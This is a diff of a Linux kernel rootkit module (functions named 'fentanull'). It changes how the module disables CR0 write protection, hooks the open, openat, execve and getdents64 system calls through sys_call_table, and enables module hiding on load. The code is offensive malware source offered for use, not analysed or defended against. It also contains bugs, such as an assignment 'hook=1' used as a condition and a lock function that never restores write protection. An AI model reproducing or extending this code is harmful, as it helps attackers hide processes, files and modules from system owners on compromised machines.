@@ -76,20 +76,21 @@ inline void custom_write_cr0(unsigned long cr0)
 	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
 }
 
-#define CR0_UNLOCK(x) \
-	do { \ 
-		unsigned long cr0; \ 
-		preempt_disable(); \
-		cr0 = read_cr0(); \
-		BUG_ON(unlikely((cr0 & X86_CR0_WP))); \
-		custom_write_cr0(cr0 & (~X86_CR0_WP)); \
-		printk(KERN_ALERT "[-] rk[cr0]: enabled!\n"); \ 
-		x; \
-		BUG_ON(unlikely(!(cr0 & X86_CR0_WP))); \  
-		custom_write_cr0(cr0 | (~X86_CR0_WP)); \
-		printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); \
-		preempt_enable(); \
-	} while(0)
+static inline void cr0_unlock(void)
+{ 
+	unsigned long cr0; 
+	cr0 = read_cr0(); 
+	custom_write_cr0(cr0 & (~0x00010000)); 
+	printk(KERN_ALERT "[-] rk[cr0]:  enabled!\n"); 
+}
+
+static inline void cr0_lock(void)
+{ 
+	unsigned long cr0; 
+	cr0 = read_cr0(); 
+	custom_write_cr0(cr0); 
+	printk(KERN_ALERT "[-] rk[cr0]: disabled!\n"); 
+} 
 
 static inline void pte_enable(int mode)
 { 
@@ -252,7 +253,9 @@ void set_openat(int hook)
 		printk(KERN_ALERT "[-] rk: hooking openat");
 		#endif
 		old_openat = (old_openat_type)sys_call_table[__NR_openat]; 
-		CR0_UNLOCK({sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;});
+		cr0_unlock();
+		sys_call_table[__NR_openat] = (unsigned long)fentanull_openat;
+		cr0_lock(); 
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
 		printk(KERN_ALERT "[-] rk: openat hooked\n");
@@ -264,7 +267,9 @@ void set_openat(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking openat\n"); 
 		#endif 
-		CR0_UNLOCK({sys_call_table[__NR_openat] = (unsigned long)old_openat;}); 
+		cr0_unlock();
+		sys_call_table[__NR_openat] = (unsigned long)old_openat;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: openat located at %p\n", old_openat);
 		printk(KERN_ALERT "[-] rk: openat unhooked\n");
@@ -275,15 +280,16 @@ void set_openat(int hook)
 
 void set_open(int hook)
 { 
-
-	unsigned int lvl;
-
-	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
 	{
 		/* HOOK ITTTTT */
+		#ifdef DEBUG 
+		printk(KERN_ALERT "[-] rk: hooking open\n"); 
+		#endif 
 		old_open = (old_open_type)sys_call_table[__NR_open]; 
-		CR0_UNLOCK({sys_call_table[__NR_open] = (unsigned long)fentanull_open;});		
+		cr0_unlock();
+		sys_call_table[__NR_open] = (unsigned long)fentanull_open;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
 		printk(KERN_ALERT "[-] rk: open hooked\n");
@@ -295,7 +301,9 @@ void set_open(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking open\n"); 
 		#endif 
-		CR0_UNLOCK({sys_call_table[__NR_open] = (unsigned long)old_open;});
+		cr0_unlock();
+		sys_call_table[__NR_open] = (unsigned long)old_open;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: open located at %p\n", old_open);
 		printk(KERN_ALERT "[-] rk: open unhooked\n");
@@ -306,10 +314,6 @@ void set_open(int hook)
 
 void set_execve(int hook)
 { 
-	/* hook == 1: hook function 
-	 * hook == 0: unhook function */
-	unsigned int lvl;
-	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
 	if (hook==1)
 	{
 		/* HOOK ITTTTT */
@@ -317,7 +321,9 @@ void set_execve(int hook)
 		printk(KERN_ALERT "[-] rk: hooking execve");
 		#endif
 		old_execve = (old_execve_type)sys_call_table[__NR_execve]; 
-		CR0_UNLOCK({sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;});
+		cr0_unlock();
+		sys_call_table[__NR_execve] = (unsigned long)fentanull_execve;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
 		printk(KERN_ALERT "[-] rk: execve hooked\n");
@@ -329,7 +335,9 @@ void set_execve(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking execve\n"); 
 		#endif 
-		CR0_UNLOCK({sys_call_table[__NR_execve] = (unsigned long)old_execve;}); 
+		cr0_unlock();
+		sys_call_table[__NR_execve] = (unsigned long)old_execve;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: execve located at %p\n", old_execve);
 		printk(KERN_ALERT "[-] rk: execve unhooked\n");
@@ -340,18 +348,16 @@ void set_execve(int hook)
 
 void set_getdents64(int hook)
 { 
-	/* hook == 1: hook function 
-	 * hook == 0: unhook function */
-	unsigned int lvl;
-	pte = lookup_address((long unsigned int)sys_call_table, &lvl); 
-	if (hook==1)
+	if (hook=1) 
 	{
 		/* HOOK ITTTTT */
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: hooking getdents64");
 		#endif
 		old_getdents64 = (old_getdents64_type)sys_call_table[__NR_getdents64]; 
-		CR0_UNLOCK({sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;});
+		cr0_unlock(); 
+		sys_call_table[__NR_getdents64] = (unsigned long)fentanull_getdents64;
+		cr0_lock();	
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
 		printk(KERN_ALERT "[-] rk: getdents64 hooked\n");
@@ -363,7 +369,9 @@ void set_getdents64(int hook)
 		#ifdef DEBUG 
 		printk(KERN_ALERT "[-] rk: unhooking getdents64\n"); 
 		#endif 
-		CR0_UNLOCK({sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;});
+		cr0_unlock();
+		sys_call_table[__NR_getdents64] = (unsigned long)old_getdents64;
+		cr0_lock();
 		#ifdef DEBUG
 		printk(KERN_ALERT "[-] rk: getdents64 located at %p\n", old_getdents64);
 		printk(KERN_ALERT "[-] rk: getdents64 unhooked\n");
@@ -396,20 +404,20 @@ static int __init fentanull_init(void)
 		hidden.files = 1; 
 		#endif 
 		#ifdef HIDE_MODULES_ON_LOAD
-		//mod_hide(); 
+		mod_hide(); 
 		#endif 
 		if (hook_type == 1)
 		{
-			//set_openat(1); 
-			set_open(1); 
+			set_openat(1); 
 			set_execve(1); 
+			set_open(1);
 			set_getdents64(1);
 			return 0;	
 		}       
 		else if (hook_type == 0)
 		{
 			pte_enable(1);
-			//set_openat(1); 
+			set_openat(1); 
 			set_open(1); 
 			set_execve(1); 
 			set_getdents64(1);
@@ -421,7 +429,6 @@ static int __init fentanull_init(void)
 	}
 }
 
-
 static void __exit fentanull_exit(void)
 { 
 	#ifdef DEBUG
@@ -432,14 +439,14 @@ static void __exit fentanull_exit(void)
 		set_execve(0); 
 		set_open(0); 
 		set_getdents64(0);
-		//set_openat(0);
+		set_openat(0);
 	}
 	else if (hook_type == 0)
 	{
 		pte_enable(1);
 		set_execve(0); 
 		set_open(0); 
-		//set_openat(0); 	
+		set_openat(0); 	
 		set_getdents64(0);
 		pte_enable(0);
 	}
